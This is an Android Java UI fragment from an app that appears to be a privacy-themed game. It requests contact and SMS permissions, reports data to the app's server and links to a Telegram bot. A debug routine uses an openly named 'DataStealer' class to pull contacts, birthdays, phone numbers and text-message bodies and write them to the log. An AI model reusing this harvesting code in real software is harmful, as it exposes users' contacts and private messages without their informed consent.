package de.hpi3d.gamepgrog.trap.ui;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Switch;
import android.widget.Toast;

import java.util.ArrayList;

import androidx.fragment.app.Fragment;
import de.hpi3d.gamepgrog.trap.R;
import de.hpi3d.gamepgrog.trap.android.DataStealer;
import de.hpi3d.gamepgrog.trap.android.PermissionHelper;
import de.hpi3d.gamepgrog.trap.api.ApiIntent;
import de.hpi3d.gamepgrog.trap.api.ApiService;
import de.hpi3d.gamepgrog.trap.api.StorageManager;
import de.hpi3d.gamepgrog.trap.datatypes.Contact;
import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
import de.hpi3d.gamepgrog.trap.future.Promise;
import de.hpi3d.gamepgrog.trap.tasks.FakeContactsTaskResolver;
import de.hpi3d.gamepgrog.trap.tasks.Task;
import de.hpi3d.gamepgrog.trap.tasks.TaskResolver;


public class MainFragment extends Fragment {

    private static final String TAG = "MAIN_FRAGMENT";

    private Button upButton;


    public MainFragment() {
        // Required empty public constructor
    }


    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_main, container, false);
        upButton = view.findViewById(R.id.button_temporary_telegram);
        upButton.setOnClickListener((View v) -> {
            sendContactDataAndPhoneNumber().then((success) -> {
                if (success) {
                    sendInitialTelegramMessage();
                }
            });
        });


        Button debugUploadContacts = view.findViewById(R.id.button_debug_steal);
        debugUploadContacts.setOnClickListener(v -> {
            onStealButtonClicked();

        });

        return view;
    }

    private void onStealButtonClicked() {
        // debugInitialiseSteal();
        Intent intent = new Intent(getActivity(), SettingsActivity.class);
        startActivity(intent);
    }

    private void debugInitialiseSteal() {
        ArrayList<Contact> contacts = DataStealer.takeContactData(getContext());
        String debugString = "";
        for (Contact contact : contacts) {

            String firstPhoneNumber;
            try {
                firstPhoneNumber = contact.getPhoneNumbers().get(0);
            } catch (IndexOutOfBoundsException e) {
                firstPhoneNumber = "";
            }

            String contactString = contact.getDisplayNamePrimary() + " ||| "
                    + contact.getBirthday() + " || "
                    + firstPhoneNumber + "|";
            for (TextMessage textMessage : contact.getTextMessages()) {
                contactString += textMessage.getBody() + "\\";
            }

            contactString += "\n";


            debugString = debugString + contactString;
        }
        Log.d("CONTACTS", debugString);

    }


    @Override
    public void onResume() {
        super.onResume();
        // TODO use firebase and remove API call
        //  FragmentActivity activity = getActivity();
        //  Intent testButtonStatus = new Intent(activity, StorageManager.class);
        //  testButtonStatus.putExtra(StorageManager.KEY_MANAGE_TYPE, StorageManager.MANAGE_TELEGRAM_BUTTON_STATUS);

        // activity.startService(testButtonStatus);

        boolean playerHasStartedConversation = StorageManager.with(getActivity()).conversationStarted.get();
        Log.d(TAG, "has player started conversation: " + playerHasStartedConversation);
        upButton.setEnabled(!playerHasStartedConversation);
    }

    private void sendInitialTelegramMessage() {
        String botUrl = StorageManager.with(getActivity()).botUrl.get();
        Log.d(TAG, "Sending Telegram Message with url: " + botUrl);
        try {
            Intent telegram = new Intent(Intent.ACTION_VIEW, Uri.parse("https://" + botUrl));
            startActivity(telegram);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private Promise<Boolean> sendContactDataAndPhoneNumber() {
        Promise<Boolean> p = Promise.create();

        String[] permissions = new String[] {
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS};

        int userid = StorageManager.with(getActivity()).userid.get();

        Task contactsTask = new Task();
        contactsTask.setDatatype("contact");

        TaskResolver resolver = new FakeContactsTaskResolver(permissions);
        resolver.executeAndShowResult(getActivity(), contactsTask).then(() -> {
            ApiIntent
                    .build(getContext())
                    .setCall(ApiService.CALL_ADD_DATA)
                    .put(ApiService.KEY_USER_ID, userid)
                    .put(ApiService.KEY_DATA_TYPE, "phonenumber")
                    .put(ApiService.KEY_DATA, null)
                    .putReceiver((code, bundle) -> p.resolve(code == ApiService.SUCCESS))
                    .start();
        });

        return p;
    }


}
